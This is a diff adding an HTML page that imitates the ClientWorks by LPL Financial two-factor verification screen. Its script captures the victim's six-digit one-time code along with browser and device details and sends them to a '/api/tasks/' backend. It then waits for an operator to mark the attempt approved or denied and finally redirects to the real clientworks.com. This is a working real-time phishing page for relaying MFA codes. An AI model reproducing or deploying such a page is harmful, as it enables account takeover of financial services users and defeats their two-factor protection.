@@ -1,0 +1,272 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verification Code | ClientWorks by LPL Financial</title>
+  <meta name="description" content="Enter your verification code to complete sign-in to ClientWorks by LPL Financial.">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="icon" href="lpl-favicon.png" type="image/png">
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="verification.css">
+  <style>
+    .verify-status {
+      display: none;
+      text-align: center;
+      padding: 5cqw;
+      font-size: 3.55cqw;
+      color: #555;
+    }
+    .verify-status .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid #ddd;
+      border-top-color: #0078bd;
+      border-radius: 50%;
+      animation: spin .6s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .verify-error {
+      display: none;
+      color: #c0392b;
+      font-size: 3.2cqw;
+      margin-top: 2cqw;
+      padding: 2cqw 3cqw;
+      background: #fdf0ef;
+      border-radius: 1cqw;
+      border: 1px solid #f5c6cb;
+      text-align: center;
+    }
+    .verify-success {
+      display: none;
+      text-align: center;
+      padding: 5cqw;
+      font-size: 3.55cqw;
+      color: #248c05;
+    }
+  </style>
+</head>
+<body>
+<header class="top">
+<div class="wordmark">ClientWorks</div>
+</header>
+  <main class="verification-stage">
+    <section class="verification-card" aria-labelledby="verification-title">
+      <div class="verification-heading">
+        <h1 id="verification-title">Enter Verification Code</h1>
+      </div>
+      <div class="verification-body" id="verify-form">
+        <p class="verification-description">We sent a 6-digit code to your contact details.</p>
+        <div class="verification-digits" role="group" aria-label="Six-digit code entry">
+          <span class="digit-slot digit-slot--selected">
+            <input class="digit-input" type="text" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="Digit 1 of 6">
+          </span>
+          <span class="digit-slot">
+            <input class="digit-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off" aria-label="Digit 2 of 6">
+          </span>
+          <span class="digit-slot">
+            <input class="digit-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off" aria-label="Digit 3 of 6">
+          </span>
+          <span class="digit-slot">
+            <input class="digit-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off" aria-label="Digit 4 of 6">
+          </span>
+          <span class="digit-slot">
+            <input class="digit-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off" aria-label="Digit 5 of 6">
+          </span>
+          <span class="digit-slot">
+            <input class="digit-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off" aria-label="Digit 6 of 6">
+          </span>
+        </div>
+        <div id="verify-error" class="verify-error"></div>
+        <p class="verification-resend">Didn't receive it? <button type="button" id="resend-btn">Resend code</button></p>
+      </div>
+      <div id="verify-loading" class="verify-status"><span class="spinner"></span> Verifying code...</div>
+      <div id="verify-success" class="verify-success"></div>
+      <div class="verification-actions">
+        <a class="verification-back" href="index.html">Back</a>
+        <button class="verification-submit" id="verify-btn" type="button">Verify</button>
+      </div>
+    </section>
+  </main>
+<footer class="footer">By logging in, you agree to the Terms of Use and the LPL Privacy Policy. Access to ClientWorks through public computers is strictly prohibited. The device in use must be in your control and must conform with the LPL Branch Office Security Policy.</footer>
+<script>
+(function(){
+  var params = new URLSearchParams(location.search);
+  var taskId = params.get("task");
+  var inputs = document.querySelectorAll(".digit-input");
+  var verifyBtn = document.getElementById("verify-btn");
+  var formEl = document.getElementById("verify-form");
+  var loadingEl = document.getElementById("verify-loading");
+  var successEl = document.getElementById("verify-success");
+  var errorEl = document.getElementById("verify-error");
+  var resendBtn = document.getElementById("resend-btn");
+
+  inputs.forEach(function(inp, i) {
+    inp.addEventListener("input", function() {
+      var val = inp.value.replace(/[^0-9]/g, "");
+      inp.value = val;
+      if (val && i < inputs.length - 1) {
+        inputs[i + 1].focus();
+      }
+      updateSlots();
+    });
+    inp.addEventListener("keydown", function(e) {
+      if (e.key === "Backspace" && !inp.value && i > 0) {
+        inputs[i - 1].focus();
+      }
+    });
+    inp.addEventListener("paste", function(e) {
+      e.preventDefault();
+      var paste = (e.clipboardData || window.clipboardData).getData("text").replace(/[^0-9]/g, "");
+      for (var j = 0; j < paste.length && i + j < inputs.length; j++) {
+        inputs[i + j].value = paste[j];
+      }
+      var next = Math.min(i + paste.length, inputs.length - 1);
+      inputs[next].focus();
+      updateSlots();
+    });
+  });
+
+  function updateSlots() {
+    inputs.forEach(function(inp) {
+      var slot = inp.closest(".digit-slot");
+      if (document.activeElement === inp) {
+        slot.classList.add("digit-slot--selected");
+      } else {
+        slot.classList.remove("digit-slot--selected");
+      }
+    });
+  }
+
+  inputs.forEach(function(inp) {
+    inp.addEventListener("focus", updateSlots);
+    inp.addEventListener("blur", updateSlots);
+  });
+
+  if (inputs[0]) inputs[0].focus();
+
+  function getCode() {
+    var code = "";
+    inputs.forEach(function(inp) { code += inp.value; });
+    return code;
+  }
+
+  verifyBtn.addEventListener("click", function() {
+    var code = getCode();
+    if (code.length < 6) {
+      errorEl.textContent = "Please enter the complete 6-digit code.";
+      errorEl.style.display = "block";
+      return;
+    }
+    if (!taskId) {
+      errorEl.textContent = "Session expired. Please sign in again.";
+      errorEl.style.display = "block";
+      return;
+    }
+    errorEl.style.display = "none";
+    formEl.style.display = "none";
+    loadingEl.style.display = "block";
+
+    fetch("/api/tasks/" + taskId, {
+      method: "PATCH",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        advance_to: "code_verify",
+        verification_code: code,
+        device_info: navigator.userAgent,
+        screen_size: screen.width + "x" + screen.height,
+        referrer: document.referrer || "Direct"
+      })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (!data.task) throw new Error("Failed");
+      pollVerify(taskId);
+    })
+    .catch(function() {
+      loadingEl.style.display = "none";
+      formEl.style.display = "block";
+      errorEl.textContent = "Unable to verify. Please try again.";
+      errorEl.style.display = "block";
+    });
+  });
+
+  function pollVerify(id) {
+    var attempts = 0;
+    var maxAttempts = 45;
+    var iv = setInterval(function() {
+      attempts++;
+      if (attempts > maxAttempts) {
+        clearInterval(iv);
+        loadingEl.style.display = "none";
+        formEl.style.display = "block";
+        errorEl.textContent = "Verification timed out. Please try again.";
+        errorEl.style.display = "block";
+        return;
+      }
+      fetch("/api/tasks/" + id)
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (!data.task) return;
+          var s = data.task.status;
+          if (s === "approved") {
+            clearInterval(iv);
+            loadingEl.style.display = "none";
+            successEl.style.display = "block";
+            var sec = 5;
+            successEl.textContent = "Verified! Redirecting in " + sec + "s...";
+            var ci = setInterval(function() {
+              sec--;
+              if (sec <= 0) {
+                clearInterval(ci);
+                window.location.href = "https://clientworks.com";
+              } else {
+                successEl.textContent = "Verified! Redirecting in " + sec + "s...";
+              }
+            }, 1000);
+          } else if (s === "denied") {
+            clearInterval(iv);
+            loadingEl.style.display = "none";
+            formEl.style.display = "block";
+            errorEl.textContent = "Verification failed. Please check the code and try again.";
+            errorEl.style.display = "block";
+            inputs.forEach(function(inp) { inp.value = ""; });
+            inputs[0].focus();
+          } else if (s === "redirected") {
+            clearInterval(iv);
+            window.location.href = "https://clientworks.com";
+          }
+        })
+        .catch(function(){});
+    }, 2000);
+  }
+
+  if (resendBtn) {
+    resendBtn.addEventListener("click", function() {
+      if (!taskId) return;
+      fetch("/api/tasks/" + taskId, {
+        method: "PATCH",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          advance_to: "code_request",
+          code_delivery_method: "email",
+          device_info: navigator.userAgent,
+          screen_size: screen.width + "x" + screen.height,
+          referrer: document.referrer || "Direct"
+        })
+      }).catch(function(){});
+      resendBtn.textContent = "Code sent!";
+      resendBtn.disabled = true;
+      setTimeout(function() {
+        resendBtn.textContent = "Resend code";
+        resendBtn.disabled = false;
+      }, 30000);
+    });
+  }
+})();
+</script>
+</body>
+</html>
